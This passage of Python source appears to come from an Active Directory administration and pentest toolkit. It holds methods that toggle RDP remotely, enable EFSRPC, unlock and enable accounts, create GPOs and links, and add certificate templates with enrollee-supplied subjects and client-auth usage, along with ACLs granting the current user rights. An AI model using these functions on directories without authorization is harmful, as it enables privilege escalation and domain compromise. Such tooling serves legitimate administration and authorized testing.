			logging.error(f"[Remove-DomainCATemplate] Template {identity} not found in domain")
			return

		# delete operation
		# delete template from Certificate Templates
		# unissue the template
		cas = ca_fetch.fetch_enrollment_services()
		for ca in cas:
			if self.ldap_session.modify(ca["distinguishedName"].value, {'certificateTemplates':[(ldap3.MODIFY_DELETE,[templates[0]["name"].value])]}):
				logging.debug(f"[Remove-DomainCATemplate] Template {templates[0]['name'].value} is no longer issued")
			else:
				logging.warning(f"[Remove-DomainCATemplate] Failed to remove template from CA. Skipping...")
		
		# delete template oid
		oid = templates[0]["msPKI-Cert-Template-OID"].value
		template_oid = self.get_domainobject(identity_filter=f'(|(msPKI-Cert-Template-OID={oid}))',searchbase=f"CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,{self.root_dn}", properties=['distinguishedName'])
		if len(template_oid) > 1:
			logging.error("[Remove-DomainCATemplate] Multiple OIDs found. Ignoring..")
		elif len(template_oid) == 0:
			logging.error("[Remove-DomainCATemplate] Template OID not found in domain. Ignoring...")

		oid_dn = template_oid[0]['attributes']['distinguishedName']
		logging.debug(f"[Remove-DomainCATemplate] Found template oid {oid_dn}")
		logging.debug(f"[Remove-DomainCATemplate] Deleting {oid_dn}")
		if self.ldap_session.delete(oid_dn):
			logging.debug(f"[Remove-DomainCATemplate] Template oid {oid} removed")
		else:
			logging.warning(f"[Remove-DomainCATemplate] Failed to remove template oid {oid}. Ignoring...")

		# delete template
		if self.ldap_session.delete(templates[0].entry_dn):
			logging.info(f"[Remove-DomainCATemplate] Success! {identity} template deleted")
			return True
		else:
			logging.error(self.ldap_session.result['message'] if self.args.debug else f"[Remove-DomainCATemplate] Failed to delete template {identity} from certificate store")
			return False

	def unlock_adaccount(self, identity=None, searchbase=None, no_cache=False, args=None):
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn
		
		# check if identity exists
		identity_object = self.get_domainobject(identity=identity, searchbase=searchbase, properties=["distinguishedName","sAMAccountName","lockoutTime"], no_cache=no_cache, raw=True)
		if len(identity_object) > 1:
			logging.error(f"[Unlock-ADAccount] More then one identity found. Use distinguishedName instead.")
			return False
		elif len(identity_object) == 0:
			logging.error(f"[Unlock-ADAccount] Identity {identity} not found in domain")
			return False

		# check if its really locked
		identity_dn = identity_object[0].get("attributes",{}).get("distinguishedName")
		identity_san = identity_object[0].get("attributes",{}).get("sAMAccountName")
		identity_lockouttime = identity_object[0].get("raw_attributes",{}).get("lockoutTime")

		logging.debug(f"[Unlock-ADAccount] Identity {identity_san} found in domain")

		if not identity_lockouttime:
			logging.warning(f"[Unlock-ADAccount] lockoutTime attribute not found. Probably not locked.")
			return False
		
		if isinstance(identity_lockouttime, list):
			identity_lockouttime = identity_lockouttime[0]
		locked = int(identity_lockouttime)

		if not locked or locked == 0:
			logging.warning(f"[Unlock-ADAccount] Account {identity_san} is not in locked state.")
			return False

		logging.debug("[Unlock-ADAccount] Modifying lockoutTime attribute")
		succeed = self.set_domainobject(  
								identity_dn,
								_set = {
										'attribute': 'lockoutTime',
										'value': '0'
									},
							  )

		if succeed:
			logging.info(f"[Unlock-ADAccount] Account {identity_san} unlocked")
			return True
		else:
			logging.info(f"[Unlock-ADAccount] Failed to unlock {identity_san}")
			return False

	def enable_rdp(self, computer=None, no_check=False, disable_restriction_admin=False, args=None):
		computer = args.computer if hasattr(args, 'computer') and args.computer else computer
		no_check = args.no_check if hasattr(args, 'no_check') and args.no_check else no_check
		disable_restriction_admin = args.disable_restriction_admin if hasattr(args, 'disable_restriction_admin') and args.disable_restriction_admin else disable_restriction_admin

		identity = self._resolve_host(computer)
		if not identity:
			logging.error(f"[Enable-RDP] Failed to resolve hostname {computer}")
			return False
		
		if not no_check:
			if check_tcp_port(identity, 3389, timeout=10, retries=1, retry_delay=0.3):
				logging.error(f"[Enable-RDP] {computer} RDP port 3389 is already open")
				return False
		
		try:
			reg = RemoteOperations(self.conn)
			dce = reg.connect(identity)
			succeed = reg.add(dce, 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server', 'fDenyTSConnections', 'REG_DWORD', "0")
		except Exception as e:
			if self.args.stack_trace:
				raise e
			else:
				logging.error(f"[Enable-RDP] Failed to enable RDP on {computer}: {e}")
			return False

		if succeed:
			logging.info(f"[Enable-RDP] RDP enabled on {computer}")
			return True
		else:
			logging.error(f"[Enable-RDP] Failed to enable RDP on {computer}")
			return False

	def disable_rdp(self, computer=None, no_check=False, disable_restriction_admin=False, args=None):
		computer = args.computer if hasattr(args, 'computer') and args.computer else computer
		no_check = args.no_check if hasattr(args, 'no_check') and args.no_check else no_check
		disable_restriction_admin = args.disable_restriction_admin if hasattr(args, 'disable_restriction_admin') and args.disable_restriction_admin else disable_restriction_admin

		identity = self._resolve_host(computer)
		if not identity:
			logging.error(f"[Disable-RDP] Failed to resolve hostname {computer}")
			return False

		if not no_check:
			if not check_tcp_port(identity, 3389, timeout=10, retries=1, retry_delay=0.3):
				logging.error(f"[Disable-RDP] {computer} RDP port 3389 is already closed")
				return False
		
		try:
			reg = RemoteOperations(self.conn)
			dce = reg.connect(identity)
			succeed = reg.add(dce, 'HKLM\\System\\CurrentControlSet\\Control\\Terminal Server', 'fDenyTSConnections', 'REG_DWORD', "1")
		except Exception as e:
			if self.args.stack_trace:
				raise e
			else:
				logging.error(f"[Disable-RDP] Failed to disable RDP on {computer}: {e}")
			return False

		if succeed:
			logging.info(f"[Disable-RDP] RDP disabled on {computer}")
			return True
		else:
			logging.error(f"[Disable-RDP] Failed to disable RDP on {computer}")
			return False

	def enable_adaccount(self, identity=None, searchbase=None, no_cache=False, args=None):
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn
		
		identity_object = self.get_domainobject(identity=identity, searchbase=searchbase, properties=["distinguishedName","sAMAccountName","userAccountControl"], no_cache=no_cache, raw=True)
		if len(identity_object) > 1:
			logging.error(f"[Enable-ADAccount] More then one identity found. Use distinguishedName instead.")
			return False
		elif len(identity_object) == 0:
			logging.error(f"[Enable-ADAccount] Identity {identity} not found in domain")
			return False

		identity_dn = identity_object[0].get("attributes",{}).get("distinguishedName")
		identity_san = identity_object[0].get("attributes",{}).get("sAMAccountName")
		identity_uac = identity_object[0].get("raw_attributes",{}).get("userAccountControl")

		logging.debug(f"[Enable-ADAccount] Identity {identity_san} found in domain")

		if isinstance(identity_uac, list):
			identity_uac = identity_uac[0]
		uac_val = int(identity_uac)

		if not (uac_val & 0x00000002):
			logging.warning(f"[Enable-ADAccount] Account {identity_san} is not in disabled state.")
			return False

		new_uac = uac_val & ~0x00000002
		succeed = self.set_domainobject(
			identity_dn,
			_set={
				'attribute': 'userAccountControl',
				'value': new_uac
			},
		)

		if succeed:
			logging.info(f"[Enable-ADAccount] Account {identity_san} enabled")
			return True
		else:
			logging.info(f"[Enable-ADAccount] Failed to enable {identity_san}")
			return False

	def disable_adaccount(self, identity=None, searchbase=None, no_cache=False, args=None):
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn
		
		identity_object = self.get_domainobject(identity=identity, searchbase=searchbase, properties=["distinguishedName","sAMAccountName","userAccountControl"], no_cache=no_cache, raw=True)
		if len(identity_object) > 1:
			logging.error(f"[Disable-ADAccount] More then one identity found. Use distinguishedName instead.")
			return False
		elif len(identity_object) == 0:
			logging.error(f"[Disable-ADAccount] Identity {identity} not found in domain")
			return False
		
		identity_dn = identity_object[0].get("attributes",{}).get("distinguishedName")
		identity_san = identity_object[0].get("attributes",{}).get("sAMAccountName")
		identity_uac = identity_object[0].get("raw_attributes",{}).get("userAccountControl")

		logging.debug(f"[Disable-ADAccount] Identity {identity_san} found in domain")

		if isinstance(identity_uac, list):
			identity_uac = identity_uac[0]
		uac_val = int(identity_uac)

		if uac_val & 0x00000002:
			logging.warning(f"[Disable-ADAccount] Account {identity_san} is already disabled.")
			return False

		new_uac = uac_val | 0x00000002
		succeed = self.set_domainobject(
			identity_dn,
			_set={
				'attribute': 'userAccountControl',
				'value': new_uac
			},
		)

		if succeed:
			logging.info(f"[Disable-ADAccount] Account {identity_san} disabled")
			return True
		else:
			logging.info(f"[Disable-ADAccount] Failed to disable {identity_san}")
			return False

	def enable_efsrpc(self, computer=None, port=135, args=None):
		computer = args.computer if hasattr(args, 'computer') and args.computer else computer
		port = args.port if hasattr(args, 'port') and args.port else port
		
		identity = self._resolve_host(computer)
		if not identity:
			logging.error(f"[Enable-EFSRPC] Failed to resolve hostname {computer}")
			return False
		
		if computer.casefold() != identity.casefold():
			logging.debug(f"[Enable-EFSRPC] Resolved hostname to IP: {identity}")
			logging.debug(f"[Enable-EFSRPC] Connecting to {identity}")
		else:
			logging.debug(f"[Enable-EFSRPC] Connecting to {computer}")

		with contextlib.suppress(Exception):
			dce = self.conn.get_dynamic_endpoint("df1941c5-fe89-4e79-bf10-463657acf44d", identity, port=port)
			if dce is None:
				logging.error("[Enable-EFSRPC] Failed to enable EFSRPC on %s" % (identity))
				return False

		logging.info("[Enable-EFSRPC] Successfully enabled EFSRPC on %s" % (identity))
		return True
		

	def add_domaingpo(self, identity, description=None, basedn=None, args=None):
		name = '{%s}' % get_uuid(upper=True)

		basedn = "CN=Policies,CN=System,%s" % (self.root_dn) if not basedn else basedn
		dn_exist = self.get_domainobject(identity=basedn)
		if not dn_exist:
			logging.error(f"[Add-DomainGPO] DN {basedn} not found in domain")
			return False

		# adding new folder policy folder in sysvol share
		dc = None
		dcs = self.get_domaincontroller(properties=['dnsHostName'])
		if len(dcs) == 0:
			logging.warning("[Add-DomainGPO] No domain controller found in ldap. Using domain as address")
		elif dcs[0].get("attributes").get("dnsHostName"):
			logging.debug("[Add-DomainGPO] Found %d domain controller(s). Using the first one" % len(dcs))
			dc = dcs[0].get("attributes").get("dnsHostName")

		if not dc:
			dc = self.domain
		
		if not self.use_kerberos:
			logging.debug("[Add-DomainGPO] Resolving hostname to IP")
			dc = host2ip(dc, self.nameserver, 3, True, use_system_ns=self.use_system_nameserver)

		share = "SYSVOL"
		policy_path = "/%s/Policies/%s" % (
			self.domain,
			name
		)
		smbconn = self.conn.init_smb_session(dc)
		try:
			tid = smbconn.connectTree(share)
		except Exception as e:
			logging.error("[Add-DomainGPO] Failed to connect to SYSVOL share")
			return False

		try:
			logging.debug("[Add-DomainGPO] Creating directories in %s" % (policy_path))
			smbconn.createDirectory(share, policy_path)
			smbconn.createDirectory(share, policy_path + "/Machine")
			smbconn.createDirectory(share, policy_path + "/User")
		except Exception as e:
			logging.error("[Add-DomainGPO] Failed to create policy directory in SYSVOL")
			logging.error(str(e))
			return False

		logging.debug("[Add-DomainGPO] Writing default GPT.INI file")
		gpt_ini_content = """[General]
Version=0
displayName=New Group Policy Object

"""
		try:
			fid = smbconn.createFile(tid, policy_path + "/GPT.ini")
		except Exception as e:
			logging.error("[Add-DomainGPO] Failed to create gpt.ini file in %s" % (policy_path))
			return False
		try:
			smbconn.writeFile(tid, fid, gpt_ini_content)
		except Exception as e:
			logging.error("[Add-DomainGPO] Failed to write gpt.ini file in %s" % (policy_path))
			return False

		smbconn.closeFile(tid, fid)
		logging.info("[Add-DomainGPO] SYSVOL policy folder successfully created!")

		dn = "CN=%s,%s" % (name, basedn)
		logging.debug(f"[Add-DomainGPO] Adding GPO with dn: {dn}")

		gpo_data = {
			'displayName':identity,
			'name': name,
			'gPCFunctionalityVersion': 2,
			'gPCFileSysPath': "\\\\%s\\SysVol%s" % (self.domain, policy_path.replace("/","\\"))
		}

		self.ldap_session.add(dn, ['top','container','groupPolicyContainer'], gpo_data)

		# adding new gplink
		if args.linkto is not None:
			self.add_gplink(guid=name, targetidentity=args.linkto)

		if self.ldap_session.result['result'] == 0:
			logging.info(f"[Add-DomainGPO] Added new {identity} GPO object")
			return True
		else:
			logging.error(f"[Add-DomainGPO] Failed to create {identity} GPO ({self.ldap_session.result['description']})")
			return False

	def add_domainou(self, identity, basedn=None, args=None):
		basedn = self.root_dn if not basedn else basedn

		dn_exist = self.get_domainobject(identity=basedn)
		if not dn_exist:
			logging.error(f"[Add-DomainOU] DN {basedn} not found in domain")
			return False

		dn = "OU=%s,%s" % (identity, basedn)
		logging.debug(f"[Add-DomainOU] OU distinguishedName: {dn}")

		
		ou_data = {
				'objectCategory': f'CN=Organizational-Unit,{self.schema_dn}',
				'name': identity,
				}

		self.ldap_session.add(dn, ['top','organizationalUnit'], ou_data)
		
		if args.protectedfromaccidentaldeletion:
			logging.info("[Add-DomainOU] Protect accidental deletion enabled")
			self.add_domainobjectacl(identity, "Everyone", rights="immutable", ace_type="denied")
		
		if self.ldap_session.result['result'] == 0:
			logging.info(f"[Add-DomainOU] Added new {identity} OU")
			return True
		else:
			logging.error(f"[Add-DomainOU] Failed to create {identity} OU ({self.ldap_session.result['description']})")
			return False

	def remove_domainou(self, identity, searchbase=None, sd_flag=None, args=None):
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		# verify if the ou exists
		targetobject = self.get_domainobject(identity=identity, searchbase=searchbase, properties=['distinguishedName'], sd_flag=sd_flag)
		if len(targetobject) > 1:
			logging.error(f"[Remove-DomainOU] More than one object found")
			return False
		elif len(targetobject) == 0:
			logging.error(f"[Remove-DomainOU] {identity} not found in domain")
			return False

		# set the object new dn
		if isinstance(targetobject, list):
			targetobject_dn = targetobject[0]["attributes"]["distinguishedName"]
		else:
			targetobject_dn = targetobject["attributes"]["distinguishedName"]

		logging.debug(f"[Remove-DomainOU] Removing {targetobject_dn}")

		succeeded = self.ldap_session.delete(targetobject_dn)

		if not succeeded:
			logging.error(f"[Remove-DomainOU] Failed to delete OU ({self.ldap_session.result['message']})")
			return False
		else:
			logging.info("[Remove-DomainOU] Success! Deleted the OU")
			return True

	def remove_gplink(self, guid, targetidentity, searchbase=None, sd_flag=None, args=None):
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		# verify that the gpidentity exists
		gpo = self.get_domaingpo(identity=guid, properties=[
			'name',
			'distinguishedName',
			],
			searchbase=searchbase,
		)
		if len(gpo) > 1:
			logging.error("[Remove-GPLink] More than one GPO found")
			return
		elif len(gpo) == 0:
			logging.error("[Remove-GPLink] GPO not found in domain")
			return

		if isinstance(gpo, list):
			gpidentity = gpo[0]["attributes"]["distinguishedName"]
		else:
			gpidentity = gpo["attributes"]["distinguishedName"]

		logging.debug(f"[Remove-GPLink] Found GPO with GUID {gpidentity}")

		# verify that the target identity exists
		target_identity = self.get_domainobject(identity=targetidentity, properties=[
			'*',
			],
			searchbase=searchbase,
			sd_flag=sd_flag
			)
		if len(target_identity) > 1:
			logging.error("[Remove-GPLink] More than one principal identity found")
			return
		elif len(target_identity) == 0:
			logging.error("[Remove-GPLink] Principal identity not found in domain")
			return

		if isinstance(target_identity, list):
			targetidentity_dn = target_identity[0]["attributes"]["distinguishedName"]
			targetidentity_gplink = target_identity[0]["attributes"].get("gPLink")
		else:
			targetidentity_dn = target_identity["attributes"]["distinguishedName"]
			targetidentity_gplink = target_identity["attributes"].get("gPLink")

		logging.debug(f"[Remove-GPLink] Found target identity {targetidentity_dn}")

		if not targetidentity_gplink:
			logging.error("[Remove-GPLink] Principal identity doesn't have any linked GPO")
			return

		# parsing gPLink attribute and remove selected gpo
		pattern = r"(?<=\[).*?(?=\])"
		new_gplink = ""
		gplinks = re.findall(pattern, targetidentity_gplink)
		for link in gplinks:
			if guid.lower() not in link.lower():
				new_gplink += "[%s]" % (link)
		
		if new_gplink:
			succeed = self.set_domainobject(  
									targetidentity_dn,
									_set = {
											'attribute': 'gPLink',
											'value': [new_gplink]
										},
								  )
		else:
			succeed = self.set_domainobject(  
									targetidentity_dn,
									clear = "gPLink"
								  )

		if succeed:
			logging.info(f"[Remove-GPLink] Successfully modified gPLink on {targetidentity_dn} OU")
			return True
		else:
			logging.error(f"[Remove-GPLink] Failed to modify gPLink on {targetidentity_dn} OU")
			return False

	def add_gplink(self, guid, targetidentity, link_enabled="Yes", enforced="No", searchbase=None, sd_flag=None, args=None):
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		# verify that the gpidentity exists
		gpo = self.get_domaingpo(identity=guid, properties=[
			'name',
			'distinguishedName',
			],
			searchbase=searchbase,
		)
		if len(gpo) > 1:
			logging.error("[Add-GPLink] More than one GPO found")
			return
		elif len(gpo) == 0:
			logging.error("[Add-GPLink] GPO not found in domain")
			return

		if isinstance(gpo, list):
			gpidentity_dn = gpo[0]["attributes"]["distinguishedName"]
		else:
			gpidentity_dn = gpo["attributes"]["distinguishedName"]

		logging.debug(f"[Add-GPLink] Found GPO with GUID {gpidentity_dn}")

		# verify that the target identity exists
		target_identity = self.get_domainobject(identity=targetidentity, properties=[
			'*',
			],
			searchbase=searchbase,
			sd_flag=sd_flag
			)
		if len(target_identity) > 1:
			logging.error("[Add-GPLink] More than one principal identity found")
			return
		elif len(target_identity) == 0:
			logging.error("[Add-GPLink] Principal identity not found in domain")
			return

		if isinstance(target_identity, list):
			targetidentity_dn = target_identity[0]["attributes"]["distinguishedName"]
			targetidentity_gplink = target_identity[0]["attributes"].get("gPLink")
		else:
			targetidentity_dn = target_identity["attributes"]["distinguishedName"]
			targetidentity_gplink = target_identity["attributes"].get("gPLink")

		logging.debug(f"[Add-GPLink] Found target identity {targetidentity_dn}")
		
		logging.warning(f"[Add-GPLink] Adding new GPLink to {targetidentity_dn}")

		attr = "0"
		if enforced.casefold() == "Yes".casefold():
			if link_enabled.casefold() == "Yes".casefold():
				attr = "2"
			elif link_enabled.casefold() == "No".casefold():
				attr = "3"
		elif enforced.casefold() == "No".casefold():
			if link_enabled.casefold() == "Yes".casefold():
				attr = "0"
			elif link_enabled.casefold() == "No".casefold():
				attr = "1"

		gpidentity = "[LDAP://%s;%s]" % (gpidentity_dn, attr)

		if targetidentity_gplink:
			if gpidentity_dn in targetidentity_gplink:
				logging.error("[Add-GPLink] gPLink attribute already exists")
				return

			logging.debug("[Add-GPLink] gPLink attribute already populated. Appending new gPLink...")
			targetidentity_gplink += gpidentity
		else:
			targetidentity_gplink = gpidentity

		if self.args.debug:
			logging.debug(f"[Add-GPLink] gPLink value: {gpidentity}")

		succeed = self.set_domainobject(  
								targetidentity_dn,
								_set = {
										'attribute': 'gPLink',
										'value': [targetidentity_gplink]
									},
							  )

		if succeed:
			logging.info(f"[Add-GPLink] Successfully added gPLink to {targetidentity_dn} OU")
			return True
		else:
			logging.error(f"[Add-GPLink] Failed to add gPLink to {targetidentity_dn} OU")
			return False

	def add_domaincatemplateacl(self, name, principalidentity, rights=None, ca_fetch=None, args=None):
		if not rights:
			if args and hasattr(args, 'rights') and args.rights:
				rights = args.rights
		else:
			rights = 'all'

		principal_identity = self.get_domainobject(identity=principalidentity, properties=[
			'objectSid',
			'distinguishedName',
			'sAMAccountName'
		])
		if len(principal_identity) > 1:
			logging.error("[Add-DomainCATemplateAcl] More than one target identity found")
			return
		elif len(principal_identity) == 0:
			logging.error("[Add-DomainCATemplateAcl] Target identity not found in domain")
			return

		logging.debug(f"[Add-DomainCATemplateAcl] Found target identity {principal_identity[0].get('attributes').get('sAMAccountName')}")

		if not ca_fetch:
			ca_fetch = CAEnum(self)

		template = ca_fetch.get_certificate_templates(identity=name)
		
		if len(template) == 0:
			logging.error(f"[Add-DomainCATemplateAcl] {name} template not found in domain")
			return
		elif len(template) > 1:
			logging.error("[Add-DomainCATemplateAcl] Multiple templates found")
			return

		logging.debug(f"[Add-DomainCATemplateAcle] Template {name} exists")

		username = self.whoami.split('\\')[1] if "\\" in self.whoami else self.whoami
		entries = self.get_domainobject(identity=username, properties=['objectSid'])
		if len(entries) == 0:
			logging.error(f"[Add-DomainCATemplateAcl] Current user {username} not found")
			return False
		elif len(entries) > 1:
			logging.error(f"[Add-DomainCATemplateAcl] More than one current user {username} found")
			return False
		current_user_sid = entries[0].get("attributes", {}).get("objectSid")
		
		if not current_user_sid:
			logging.error(f"[Add-DomainCATemplateAcl] Current user {username} has no objectSid")
			return False
		template_parser = PARSE_TEMPLATE(template[0],current_user_sid=current_user_sid,ldap_session = self.ldap_session)
		secDesc = template_parser.modify_dacl(principal_identity[0].get('attributes').get('objectSid'), rights)
		succeed = self.set_domainobject(  
								name,
								_set = {
										'attribute': 'nTSecurityDescriptor',
										'value': [secDesc]
									},
								searchbase=f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{self.root_dn}",
								sd_flag = 0x04
							  )
		if succeed:
			logging.info(f"[Add-DomainCATemplateAcl] Successfully modified {name} template acl")
			return True
		else:
			logging.error(f"[Add-DomainCATemplateAcl] Failed to modify {name} template ACL")
			return False

	def add_domaincatemplate(self, displayname, name=None, args=None):
		ca_fetch = CAEnum(self)

		if not name:
			logging.debug("[Add-DomainCATemplate] No certificate name given, using DisplayName instead")
			name = displayname.replace(" ","").strip()

		# check if template exists
		ex_templates = ca_fetch.get_certificate_templates(identity=name)
		if len(ex_templates) > 0:
			logging.error(f"[Add-DomainCATemplate] Template {name} already exists")
			return

		if args.duplicate:
			# query for other cert template
			identity = args.duplicate
			entries = ca_fetch.get_certificate_templates(identity=identity, properties=['*'])
			if len(entries) > 1:
				logging.error("[Add-DomainCATemplate] More than one certificate templates found")
				return False
			elif len(entries) == 0:
				logging.error("[Add-DomainCATemplate] No certificate template found")
				return False

			logging.info(f"[Add-DomainCATemplate] Duplicating existing template {args.duplicate} properties")
			default_template = {
				'DisplayName': displayname,
				'name': name,
				'msPKI-Certificate-Name-Flag' : int(entries[0].get('attributes').get('msPKI-Certificate-Name-Flag')) if entries[0].get('attributes').get('msPKI-Certificate-Name-Flag') else 1,
				'msPKI-Enrollment-Flag': int(entries[0].get('attributes').get('msPKI-Enrollment-Flag')) if entries[0].get('attributes').get('msPKI-Enrollment-Flag') else 41,
				'revision': int(entries[0].get('attributes').get('revision')) if entries[0].get('attributes').get('revision') else 3,
				'pKIDefaultKeySpec': int(entries[0].get('attributes').get('pKIDefaultKeySpec')) if entries[0].get('attributes').get('pKIDefaultKeySpec') else 1,
				'msPKI-RA-Signature': int(entries[0].get('attributes').get('msPKI-RA-Signature')) if entries[0].get('attributes').get('msPKI-RA-Signature') else 0,
				'pKIMaxIssuingDepth': int(entries[0].get('attributes').get('pKIMaxIssuingDepth')) if entries[0].get('attributes').get('pKIMaxIssuingDepth') else 0,
				'msPKI-Template-Schema-Version': int(entries[0].get('attributes').get('msPKI-Template-Schema-Version')) if entries[0].get('attributes').get('msPKI-Template-Schema-Version') else 1,
				'msPKI-Template-Minor-Revision': int(entries[0].get('attributes').get('msPKI-Template-Minor-Revision')) if entries[0].get('attributes').get('msPKI-Template-Minor-Revision') else 1,
				'msPKI-Private-Key-Flag': int(entries[0].get('attributes').get('msPKI-Private-Key-Flag')) if entries[0].get('attributes').get('msPKI-Private-Key-Flag') else 16842768,
				'msPKI-Minimal-Key-Size': int(entries[0].get('attributes').get('msPKI-Minimal-Key-Size')) if entries[0].get('attributes').get('msPKI-Minimal-Key-Size') else 2048,
				"pKICriticalExtensions": entries[0].get('attributes').get('pKICriticalExtensions') if entries[0].get('attributes').get('pKICriticalExtensions') else ["2.5.29.19", "2.5.29.15"],
				"pKIExtendedKeyUsage": entries[0].get('attributes').get('pKIExtendedKeyUsage') if entries[0].get('attributes').get('pKIExtendedKeyUsage') else ["1.3.6.1.4.1.311.10.3.4","1.3.6.1.5.5.7.3.4","1.3.6.1.5.5.7.3.2"],
				'nTSecurityDescriptor': entries[0].get('attributes').get('nTSecurityDescriptor'),
				"pKIExpirationPeriod": entries[0].get('attributes').get('pKIExpirationPeriod'),
				"pKIOverlapPeriod": entries[0].get('attributes').get('pKIOverlapPeriod'),
				"pKIDefaultCSPs": entries[0].get('attributes').get('pKIDefaultCSPs') if entries[0].get('attributes').get('pKIDefaultCSPs') else b"1,Microsoft Enhanced Cryptographic Provider v1.0",
			}
		else:
			default_template = {
				'DisplayName': displayname,
				'name': name,
				'msPKI-Certificate-Name-Flag' : 1,
				'msPKI-Enrollment-Flag': 41,
				'revision': 3,
				'pKIDefaultKeySpec': 1,
				'msPKI-RA-Signature': 0,
				'pKIMaxIssuingDepth': 0,
				'msPKI-Template-Schema-Version': 1,
				'msPKI-Template-Minor-Revision': 1,
				'msPKI-Private-Key-Flag': 16842768,
				'msPKI-Minimal-Key-Size': 2048,
				"pKICriticalExtensions": ["2.5.29.19", "2.5.29.15"],
				"pKIExtendedKeyUsage": [
					"1.3.6.1.4.1.311.10.3.4",
					"1.3.6.1.5.5.7.3.4",
					"1.3.6.1.5.5.7.3.2"
				],
				"pKIExpirationPeriod": b"\x00@\x1e\xa4\xe8e\xfa\xff",
				"pKIOverlapPeriod": b"\x00\x80\xa6\n\xff\xde\xff\xff",
				"pKIDefaultCSPs": b"1,M#icrosoft Enhanced Cryptographic Provider v1.0",
			}

		# create certiciate template
		# create oid
		oids = ca_fetch.get_issuance_policies()

		if len(oids) == 0:
			logging.error("[Add-DomainCATemplate] No Forest OID found in domain")
			return False

		# Get the forest OID from the OID container itself, not from a specific template
		forest_oid = None
		for oid in oids:
			if 'attributes' in oid and 'msPKI-Cert-Template-OID' in oid['attributes'] and not oid['attributes'].get('displayName'):
				forest_oid = oid['attributes']['msPKI-Cert-Template-OID']
				break
		
		if not forest_oid:
			# Fallback to the first OID if we couldn't find the container OID
			forest_oid = oids[0]['attributes']['msPKI-Cert-Template-OID']
		
		template_oid, template_name = UTILS.get_template_oid(forest_oid)
		if not ca_fetch.add_oid(template_name, template_oid):
			logging.error(f"[Add-DomainCATemplate] Error adding new template OID ({self.ldap_session.result['description']})")
			return False

		logging.info(f"[Add-DomainCATemplate] Added new template OID {template_oid}")

		template_base = f"CN={name},CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{self.root_dn}"
		self.ldap_session.add(template_base, ['top','pKICertificateTemplate'], default_template)
		if self.ldap_session.result['result'] == 0:
			logging.info(f"[Add-DomainCATemplate] Added new certificate template {name}")
		else:
			logging.error(f"[Add-DomainCATemplate] Failed to create certiciate template {name} ({self.ldap_session.result['description']})")
			return False

		# set acl for the template
		if not args.duplicate:
			cur_user = self.whoami.split('\\')[1] if "\\" in self.whoami else self.whoami
			logging.debug("[Add-DomainCATemplate] Modifying template ACL for current user")
			if not self.add_domaincatemplateacl(name,cur_user,ca_fetch=ca_fetch):
				logging.debug("[Add-DomainCATemplate] Failed to modify template ACL. Skipping...")

		# issue certificate
		cas = ca_fetch.fetch_enrollment_services()
		for ca in cas:
			ca_dn = ca.get('attributes').get('distinguishedName')
			ca_name = ca.get('attributes').get('name')
			logging.debug(f"[Add-DomainCATemplate] Issuing certificate template to {ca_name}")
			succeed = self.set_domainobject(
						ca_name,
						append={
							'attribute': 'certificateTemplates',
							'value': [name]
						},
						searchbase = ca_dn
					)

			if succeed:
				logging.info(f"[Add-DomainCATemplate] Template {name} issued!")
			else:
				logging.error("[Add-DomainCATemplate] Failed to issue template")

		return succeed

	def get_domaincatemplate(self, args=None, properties=[], identity=None, vulnerable=False, searchbase=None, resolve_sids=False, no_cache=False, no_vuln_check=False, raw=False):
		def list_sids(sids: List[str]):
			sids_mapping = list(
				map(
					lambda sid: repr(self.convertfrom_sid(sid)),
					sids,
				)
			)
			if len(sids_mapping) == 1:
				return sids_mapping[0]

			return ", ".join(sids_mapping[:-1]) + " and " + sids_mapping[-1]

		def_prop = [
			"objectClass",
			"cn",
			"distinguishedName",
			"name",
			"displayName",
			"pKIExpirationPeriod",
			"pKIOverlapPeriod",
			"msPKI-Enrollment-Flag",
			"msPKI-Private-Key-Flag",
			"msPKI-Certificate-Name-Flag",
			"msPKI-Cert-Template-OID",
			"msPKI-RA-Signature",
			"pKIExtendedKeyUsage",
			"nTSecurityDescriptor",
			"objectGUID",
			"msPKI-Template-Schema-Version",
			"msPKI-Certificate-Policy",
			"msPKI-Minimal-Key-Size"
		]

		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{self.root_dn}"
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw
		resolve_sids = args.resolve_sids if hasattr(args, 'resolve_sids') and args.resolve_sids else resolve_sids
		args_enabled = args.enabled if hasattr(args, 'enabled') and args.enabled else False
		args_vulnerable = args.vulnerable if hasattr(args, 'vulnerable') and args.vulnerable else vulnerable

		entries = []
		template_guids = []
		ca_fetch = CAEnum(self)

		templates = ca_fetch.get_certificate_templates(
			def_prop,
			searchbase,
			identity,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)
		logging.debug(f"[Get-DomainCATemplate] Found {len(templates)} templates")
		cas = ca_fetch.fetch_enrollment_services(
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		if len(cas) <= 0:
			logging.error(f"[Get-DomainCATemplate] No certificate authority found")
			return

		logging.debug(f"[Get-DomainCATemplate] Found {len(cas)} CA(s)")

		ca_templates = []
		list_entries = []

